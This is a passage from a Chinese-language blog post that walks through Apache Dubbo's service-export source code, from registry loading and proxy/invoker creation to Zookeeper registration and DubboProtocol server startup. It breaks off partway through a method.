<p>这个方法中，大部分逻辑都是对配置信息的检查：</p>
<ul>
<li>checkDefault()：检查ProviderConfig是否存在，若不存在，则创建一个新的ProviderConfig，接着，从系统变量中读取相关约定的配置值设置进去。</li>
<li>checkApplication()：主要检查ApplicationConfig是否存在，若不存在，则和checkDefault()中的处理大体相同。application用于配置dubbo服务的应用信息。</li>
<li>checkRegistry()：检查RegistryConfig，同上处理，不过RegistryConfig是集合形式，具有多个配置，每一个RegistryConfig都代表一个注册中心配置。</li>
<li>checkProtocol()：检查ProtocolConfig，同上处理。ProtocolConfig是用于配置dubbo服务RPC所用的协议，一般都是默认使用dubbo协议进行通讯。</li>
<li>appendProperties(this)：对ServiceConfig进行配置追加处理，从系统变量读取约定key的配置值。</li>
<li>checkStub(interfaceClass)和checkMock(interfaceClass)：检查service的interface是否满足stub和mock。</li>
<li>doExportUrls()：暴露服务核心逻辑方法。</li>
</ul>
<p>doExportUrls()：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">private void doExportUrls() &#123;</span><br><span class="line">    //读取注册中心配置</span><br><span class="line">    List&lt;URL&gt; registryURLs = loadRegistries(true);</span><br><span class="line">    //遍历协议配置，根据协议进行暴露服务</span><br><span class="line">    for (ProtocolConfig protocolConfig : protocols) &#123;</span><br><span class="line">        doExportUrlsFor1Protocol(protocolConfig, registryURLs);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>dubbo的设置，是基于总线模式，也就是它的配置传递，全部都靠URL这个类的实例进行传递，有好处也有坏处，好处是对于一些方法栈比较深的参数传递，在进行代码修改后，不需要修改传递中所涉及到的所有方法，而坏处是，不够直观，URL中到底存有哪些数据参数传递，可读性很差。</p>
<p>loadRegistries(true)：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">protected List&lt;URL&gt; loadRegistries(boolean provider) &#123;</span><br><span class="line">    checkRegistry();</span><br><span class="line">    List&lt;URL&gt; registryList = new ArrayList&lt;URL&gt;();</span><br><span class="line">    //判断注册中心配置是否为空，若是空的，那没必要继续走下去了</span><br><span class="line">    if (registries != null &amp;&amp; !registries.isEmpty()) &#123;</span><br><span class="line">        //遍历注册中心配置，读取相关配置信息，每一个对应一个URL存储</span><br><span class="line">        for (RegistryConfig config : registries) &#123;</span><br><span class="line">            String address = config.getAddress();</span><br><span class="line">            if (address == null || address.length() == 0) &#123;</span><br><span class="line">                address = Constants.ANYHOST_VALUE;</span><br><span class="line">            &#125;</span><br><span class="line">            String sysaddress = System.getProperty(&quot;dubbo.registry.address&quot;);</span><br><span class="line">            if (sysaddress != null &amp;&amp; sysaddress.length() &gt; 0) &#123;</span><br><span class="line">                address = sysaddress;</span><br><span class="line">            &#125;</span><br><span class="line">            if (address.length() &gt; 0 &amp;&amp; !RegistryConfig.NO_AVAILABLE.equalsIgnoreCase(address)) &#123;</span><br><span class="line">                Map&lt;String, String&gt; map = new HashMap&lt;String, String&gt;();</span><br><span class="line">                appendParameters(map, application);</span><br><span class="line">                appendParameters(map, config);</span><br><span class="line">                map.put(&quot;path&quot;, RegistryService.class.getName());</span><br><span class="line">                map.put(&quot;dubbo&quot;, Version.getProtocolVersion());</span><br><span class="line">                map.put(Constants.TIMESTAMP_KEY, String.valueOf(System.currentTimeMillis()));</span><br><span class="line">                if (ConfigUtils.getPid() &gt; 0) &#123;</span><br><span class="line">                    map.put(Constants.PID_KEY, String.valueOf(ConfigUtils.getPid()));</span><br><span class="line">                &#125;</span><br><span class="line">                if (!map.containsKey(&quot;protocol&quot;)) &#123;</span><br><span class="line">                    if (ExtensionLoader.getExtensionLoader(RegistryFactory.class).hasExtension(&quot;remote&quot;)) &#123;</span><br><span class="line">                        map.put(&quot;protocol&quot;, &quot;remote&quot;);</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        map.put(&quot;protocol&quot;, &quot;dubbo&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                List&lt;URL&gt; urls = UrlUtils.parseURLs(address, map);</span><br><span class="line">                for (URL url : urls) &#123;</span><br><span class="line">                    url = url.addParameter(Constants.REGISTRY_KEY, url.getProtocol());</span><br><span class="line">                    url = url.setProtocol(Constants.REGISTRY_PROTOCOL);</span><br><span class="line">                    if ((provider &amp;&amp; url.getParameter(Constants.REGISTER_KEY, true))</span><br><span class="line">                            || (!provider &amp;&amp; url.getParameter(Constants.SUBSCRIBE_KEY, true))) &#123;</span><br><span class="line">                        registryList.add(url);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return registryList;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>doExportUrlsFor1Protocol(protocolConfig, registryURLs)：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">private void doExportUrlsFor1Protocol(ProtocolConfig protocolConfig, List&lt;URL&gt; registryURLs) &#123;</span><br><span class="line">    //...代码略多，但基本都不是重点</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>doExportUrlsFor1Protocol方法中，主要就是做了两件事：</p>
<ol>
<li>对URL总线配置追加一些配置</li>
<li>对服务实现类进行动态代理，生成invoker，接着使用通讯协议实现类进行服务暴露</li>
</ol>
<p>服务暴露的主要代码有两处：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Invoker&lt;?&gt; invoker = proxyFactory.getInvoker(ref, (Class) interfaceClass, registryURL.addParameterAndEncoded(Constants.EXPORT_KEY, url.toFullString()));</span><br><span class="line">DelegateProviderMetaDataInvoker wrapperInvoker = new DelegateProviderMetaDataInvoker(invoker, this);</span><br><span class="line"></span><br><span class="line">Exporter&lt;?&gt; exporter = protocol.export(wrapperInvoker);</span><br><span class="line">exporters.add(exporter);</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Invoker&lt;?&gt; invoker = proxyFactory.getInvoker(ref, (Class) interfaceClass, url);</span><br><span class="line">DelegateProviderMetaDataInvoker wrapperInvoker = new DelegateProviderMetaDataInvoker(invoker, this);</span><br><span class="line"></span><br><span class="line">Exporter&lt;?&gt; exporter = protocol.export(wrapperInvoker);</span><br><span class="line">exporters.add(exporter);</span><br></pre></td></tr></table></figure>
<p>这两处基本都是一致的处理，首先通过proxyFactory代理工厂对象对interface进行代理，dubbo中代理工厂实现有两类：</p>
<ol>
<li>javassist</li>
<li>jdk proxy</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">org.apache.dubbo.rpc.proxy.javassist.JavassistProxyFactory</span><br><span class="line"></span><br><span class="line">org.apache.dubbo.rpc.proxy.jdk.JdkProxyFactory</span><br></pre></td></tr></table></figure>
<p>它们位于dubbo-rpc-api这个module的com.alibaba.dubbo.rpc.proxy包底下。</p>
<p>其中它们都具有getProxy、getInvoker方法实现</p>
<p>getProxy：主要用于服务消费者对interface进行代理，生成实例提供程序调用。而InvokerInvocationHandler是实际调用对象，其对上层程序代码隐藏了远程调用的细节</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public &lt;T&gt; T getProxy(Invoker&lt;T&gt; invoker, Class&lt;?&gt;[] interfaces) &#123;</span><br><span class="line">    return (T) Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(), interfaces, new InvokerInvocationHandler(invoker));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>getInvoker：主要用于服务提供者对实际被调用实例进行代理包装，以实现实际对象方法被调用后，进行结果、异常的CompletableFuture的封装</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line">public &lt;T&gt; Invoker&lt;T&gt; getInvoker(T proxy, Class&lt;T&gt; type, URL url) &#123;</span><br><span class="line">    return new AbstractProxyInvoker&lt;T&gt;(proxy, type, url) &#123;</span><br><span class="line">        @Override</span><br><span class="line">        protected Object doInvoke(T proxy, String methodName,</span><br><span class="line">                                  Class&lt;?&gt;[] parameterTypes,</span><br><span class="line">                                  Object[] arguments) throws Throwable &#123;</span><br><span class="line">            Method method = proxy.getClass().getMethod(methodName, parameterTypes);</span><br><span class="line">            return method.invoke(proxy, arguments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也就是说，getProxy方法为服务消费者，也就是RPC的客户端生成代理实例，作为进行RPC的媒介，而getInvoker为服务提供者，也即是RPC的服务端，它的服务实现进行包装。</p>
<p>客户端，也就是服务消费者在执行RPC时，真正执行的是InvokerInvocationHandler的invoke，了解java动态代理的会很清楚，InvokerInvocationHandler包装了真正的RPC实现</p>
<p>InvokerInvocationHandler：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;</span><br><span class="line">    String methodName = method.getName();</span><br><span class="line">    Class&lt;?&gt;[] parameterTypes = method.getParameterTypes();</span><br><span class="line">    if (method.getDeclaringClass() == Object.class) &#123;</span><br><span class="line">        return method.invoke(invoker, args);</span><br><span class="line">    &#125;</span><br><span class="line">    if (&quot;toString&quot;.equals(methodName) &amp;&amp; parameterTypes.length == 0) &#123;</span><br><span class="line">        return invoker.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    if (&quot;hashCode&quot;.equals(methodName) &amp;&amp; parameterTypes.length == 0) &#123;</span><br><span class="line">        return invoker.hashCode();</span><br><span class="line">    &#125;</span><br><span class="line">    if (&quot;equals&quot;.equals(methodName) &amp;&amp; parameterTypes.length == 1) &#123;</span><br><span class="line">        return invoker.equals(args[0]);</span><br><span class="line">    &#125;</span><br><span class="line">    if (&quot;$destroy&quot;.equals(methodName) &amp;&amp; parameterTypes.length == 0) &#123;</span><br><span class="line">        invoker.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    RpcInvocation rpcInvocation = new RpcInvocation(method, invoker.getInterface().getName(), args);</span><br><span class="line">    rpcInvocation.setTargetServiceUniqueName(invoker.getUrl().getServiceKey());</span><br><span class="line"></span><br><span class="line">    return invoker.invoke(rpcInvocation).recreate();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>从上述代码可以知道，对于一些方法，默认是不会进行RPC。</p>
<p>AbstractProxyInvoker：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">public Result invoke(Invocation invocation) throws RpcException &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        Object value = doInvoke(proxy, invocation.getMethodName(), invocation.getParameterTypes(), invocation.getArguments());</span><br><span class="line">        CompletableFuture&lt;Object&gt; future = wrapWithFuture(value, invocation);</span><br><span class="line">        CompletableFuture&lt;AppResponse&gt; appResponseFuture = future.handle((obj, t) -&gt; &#123;</span><br><span class="line">            AppResponse result = new AppResponse();</span><br><span class="line">            if (t != null) &#123;</span><br><span class="line">                if (t instanceof CompletionException) &#123;</span><br><span class="line">                    result.setException(t.getCause());</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    result.setException(t);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                result.setValue(obj);</span><br><span class="line">            &#125;</span><br><span class="line">            return result;</span><br><span class="line">        &#125;);</span><br><span class="line">        return new AsyncRpcResult(appResponseFuture, invocation);</span><br><span class="line">    &#125; catch (InvocationTargetException e) &#123;</span><br><span class="line">        if (RpcContext.getContext().isAsyncStarted() &amp;&amp; !RpcContext.getContext().stopAsync()) &#123;</span><br><span class="line">            logger.error(&quot;Provider async started, but got an exception from the original method, cannot write the exception back to consumer because an async result may have returned the new thread.&quot;, e);</span><br><span class="line">        &#125;</span><br><span class="line">        return AsyncRpcResult.newDefaultAsyncResult(null, e.getTargetException(), invocation);</span><br><span class="line">    &#125; catch (Throwable e) &#123;</span><br><span class="line">        throw new RpcException(&quot;Failed to invoke remote proxy method &quot; + invocation.getMethodName() + &quot; to &quot; + getUrl() + &quot;, cause: &quot; + e.getMessage(), e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>到此为止的总结是：</p>
<ul>
<li>服务提供者启动时，先创建相应选择的协议对象（Protocol），然后通过代理工厂创建Invoker对象，接着使用协议对象对Invoker进行服务注册至注册中心。</li>
<li>服务消费者启动时，先创建相应选择的协议对象（Protocol），然后通过协议对象引用到服务提供者，得到Invoker对象，接着通过代理工厂创建proxy对象。</li>
</ul>
<p>回到ServiceConfig的doExportUrlsFor1Protocol方法中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Exporter&lt;?&gt; exporter = protocol.export(wrapperInvoker);</span><br></pre></td></tr></table></figure>
<p>从栈信息我们可以知道，其中protocol经过了多层的包装，通过装饰模式进行一些额外功能的加入，从而实现一条链式的执行，包括注册中心注册、协议暴露等。</p>
<p>跟进protocol的注册协议expose实现中（com.alibaba.dubbo.registry.integration.RegistryProtocol#export）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line">public &lt;T&gt; Exporter&lt;T&gt; export(final Invoker&lt;T&gt; originInvoker) throws RpcException &#123;</span><br><span class="line">    //export invoker</span><br><span class="line">    final ExporterChangeableWrapper&lt;T&gt; exporter = doLocalExport(originInvoker);</span><br><span class="line"></span><br><span class="line">    URL registryUrl = getRegistryUrl(originInvoker);</span><br><span class="line"></span><br><span class="line">    //registry provider</span><br><span class="line">    //通过SPI的方式，根据URL的配置（dubbo:registry标签配置），获取对应的Registry实例，进行注册到注册中心</span><br><span class="line">    final Registry registry = getRegistry(originInvoker);</span><br><span class="line">    final URL registeredProviderUrl = getRegisteredProviderUrl(originInvoker);</span><br><span class="line"></span><br><span class="line">    //to judge to delay publish whether or not</span><br><span class="line">    boolean register = registeredProviderUrl.getParameter(&quot;register&quot;, true);</span><br><span class="line"></span><br><span class="line">    ProviderConsumerRegTable.registerProvider(originInvoker, registryUrl, registeredProviderUrl);</span><br><span class="line"></span><br><span class="line">    if (register) &#123;</span><br><span class="line">        //注册到注册中心</span><br><span class="line">        register(registryUrl, registeredProviderUrl);</span><br><span class="line">        ProviderConsumerRegTable.getProviderWrapper(originInvoker).setReg(true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Subscribe the override data</span><br><span class="line">    // FIXME When the provider subscribes, it will affect the scene : a certain JVM exposes the service and call the same service. Because the subscribed is cached key with the name of the service, it causes the subscription information to cover.</span><br><span class="line">    final URL overrideSubscribeUrl = getSubscribedOverrideUrl(registeredProviderUrl);</span><br><span class="line">    final OverrideListener overrideSubscribeListener = new OverrideListener(overrideSubscribeUrl, originInvoker);</span><br><span class="line">    overrideListeners.put(overrideSubscribeUrl, overrideSubscribeListener);</span><br><span class="line">    //订阅对应的service在注册中心的数据，数据被覆盖修改后，可以得到通知处理</span><br><span class="line">    registry.subscribe(overrideSubscribeUrl, overrideSubscribeListener);</span><br><span class="line">    //Ensure that a new exporter instance is returned every time export</span><br><span class="line">    return new DestroyableExporter&lt;T&gt;(exporter, originInvoker, overrideSubscribeUrl, registeredProviderUrl);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注册到注册中心：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public void register(URL registryUrl, URL registedProviderUrl) &#123;</span><br><span class="line">    Registry registry = registryFactory.getRegistry(registryUrl);</span><br><span class="line">    registry.register(registedProviderUrl);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>实际上，真正的注册到注册中心的实现，被com.alibaba.dubbo.registry.support.FailbackRegistry#register包装了</p>
<p>FailbackRegistry#register：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line">public void register(URL url) &#123;</span><br><span class="line">    super.register(url);</span><br><span class="line">    failedRegistered.remove(url);</span><br><span class="line">    failedUnregistered.remove(url);</span><br><span class="line">    try &#123;</span><br><span class="line">        // Sending a registration request to the server side</span><br><span class="line">        doRegister(url);</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        Throwable t = e;</span><br><span class="line"></span><br><span class="line">        // If the startup detection is opened, the Exception is thrown directly.</span><br><span class="line">        boolean check = getUrl().getParameter(Constants.CHECK_KEY, true)</span><br><span class="line">                &amp;&amp; url.getParameter(Constants.CHECK_KEY, true)</span><br><span class="line">                &amp;&amp; !Constants.CONSUMER_PROTOCOL.equals(url.getProtocol());</span><br><span class="line">        boolean skipFailback = t instanceof SkipFailbackWrapperException;</span><br><span class="line">        if (check || skipFailback) &#123;</span><br><span class="line">            if (skipFailback) &#123;</span><br><span class="line">                t = t.getCause();</span><br><span class="line">            &#125;</span><br><span class="line">            throw new IllegalStateException(&quot;Failed to register &quot; + url + &quot; to registry &quot; + getUrl().getAddress() + &quot;, cause: &quot; + t.getMessage(), t);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            logger.error(&quot;Failed to register &quot; + url + &quot;, waiting for retry, cause: &quot; + t.getMessage(), t);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Record a failed registration request to a failed list, retry regularly</span><br><span class="line">        failedRegistered.add(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>FailbackRegistry实现了一些容错机制的处理。</p>
<p>doRegister的具体实现，因为我们这边配置的是zookeeper注册中心，所以实现类为com.alibaba.dubbo.registry.zookeeper.ZookeeperRegistry#doRegister</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line">protected void doRegister(URL url) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        zkClient.create(toUrlPath(url), url.getParameter(Constants.DYNAMIC_KEY, true));</span><br><span class="line">    &#125; catch (Throwable e) &#123;</span><br><span class="line">        throw new RpcException(&quot;Failed to register &quot; + url + &quot; to zookeeper &quot; + getUrl() + &quot;, cause: &quot; + e.getMessage(), e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这边用惯zookeeper的读者，可以清晰的看到，使用了zookeeper的java客户端进行创建节点，也就是完成了对服务的注册到注册中心（zookeeper）。</p>
<p>接着，在装饰模式下，下一步执行的是dubbo协议的暴露服务。</p>
<p>跟进protocol的dubbo协议expose实现中（com.alibaba.dubbo.rpc.protocol.dubbo.DubboProtocol#export）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line">public &lt;T&gt; Exporter&lt;T&gt; export(Invoker&lt;T&gt; invoker) throws RpcException &#123;</span><br><span class="line">    //取出URL总线配置</span><br><span class="line">    URL url = invoker.getUrl();</span><br><span class="line"></span><br><span class="line">    // export service.</span><br><span class="line">    //根据url配置，生成注册到注册中心的service key</span><br><span class="line">    String key = serviceKey(url);</span><br><span class="line">    //把invoker放到一个集合map中，后续RPC的时候取出调用</span><br><span class="line">    DubboExporter&lt;T&gt; exporter = new DubboExporter&lt;T&gt;(invoker, key, exporterMap);</span><br><span class="line">    exporterMap.put(key, exporter);</span><br><span class="line"></span><br><span class="line">    //export an stub service for dispatching event</span><br><span class="line">    Boolean isStubSupportEvent = url.getParameter(Constants.STUB_EVENT_KEY, Constants.DEFAULT_STUB_EVENT);</span><br><span class="line">    Boolean isCallbackservice = url.getParameter(Constants.IS_CALLBACK_SERVICE, false);</span><br><span class="line">    if (isStubSupportEvent &amp;&amp; !isCallbackservice) &#123;</span><br><span class="line">        String stubServiceMethods = url.getParameter(Constants.STUB_EVENT_METHODS_KEY);</span><br><span class="line">        if (stubServiceMethods == null || stubServiceMethods.length() == 0) &#123;</span><br><span class="line">            if (logger.isWarnEnabled()) &#123;</span><br><span class="line">                logger.warn(new IllegalStateException(&quot;consumer [&quot; + url.getParameter(Constants.INTERFACE_KEY) +</span><br><span class="line">                        &quot;], has set stubproxy support event ,but no stub methods founded.&quot;));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            stubServiceMethodsMap.put(url.getServiceKey(), stubServiceMethods);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //根据url配置创建服务提供者服务器，接收服务消费者的请求（RPC通讯）</span><br><span class="line">    openServer(url);</span><br><span class="line">    //配置自定义的序列化实现</span><br><span class="line">    optimizeSerialization(url);</span><br><span class="line">    return exporter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上述代码的核心地方是openServer方法的调用，最终通过它创建一个服务提供者的服务端，用于接收消费者的RPC请求。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">private void openServer(URL url) &#123;</span><br><span class="line">    // find server.</span><br><span class="line">    String key = url.getAddress();</span><br><span class="line">    //client can export a service which&apos;s only for server to invoke</span><br><span class="line">    boolean isServer = url.getParameter(Constants.IS_SERVER_KEY, true);</span><br><span class="line">    if (isServer) &#123;</span><br><span class="line">        //从缓存读取ExchangeServer，若不存在则创建新的ExchangeServer，并缓存到map中</span><br><span class="line">        ExchangeServer server = serverMap.get(key);</span><br><span class="line">        if (server == null) &#123;</span><br><span class="line">            serverMap.put(key, createServer(url));</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            //若缓存已存在，则reset重置服务</span><br><span class="line">            // server supports reset, use together with override</span><br><span class="line">            server.reset(url);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>创建服务：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">private ExchangeServer createServer(URL url) &#123;</span><br><span class="line">    //...</span><br><span class="line">    ExchangeServer server;</span><br><span class="line">    try &#123;</span><br><span class="line">        server = Exchangers.bind(url, requestHandler);</span><br><span class="line">    &#125; catch (RemotingException e) &#123;</span><br><span class="line">        throw new RpcException(&quot;Fail to start server(url: &quot; + url + &quot;) &quot; + e.getMessage(), e);</span><br><span class="line">    &#125;</span><br><span class="line">    //...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>从上面的代码可以看到，dubbo中不但广泛地使用URL消息总线模式，还广泛的使用SPI（PS：扩展了Java原生的SPI）</p>
<p>跟进Exchangers.bind(url, requestHandler)方法实现：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public static ExchangeServer bind(URL url, ExchangeHandler handler) throws RemotingException &#123;</span><br><span class="line">    if (url == null) &#123;</span><br><span class="line">        throw new IllegalArgumentException(&quot;url == null&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if (handler == null) &#123;</span><br><span class="line">        throw new IllegalArgumentException(&quot;handler == null&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    url = url.addParameterIfAbsent(Constants.CODEC_KEY, &quot;exchange&quot;);</span><br><span class="line">    return getExchanger(url).bind(url, handler);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public static Exchanger getExchanger(URL url) 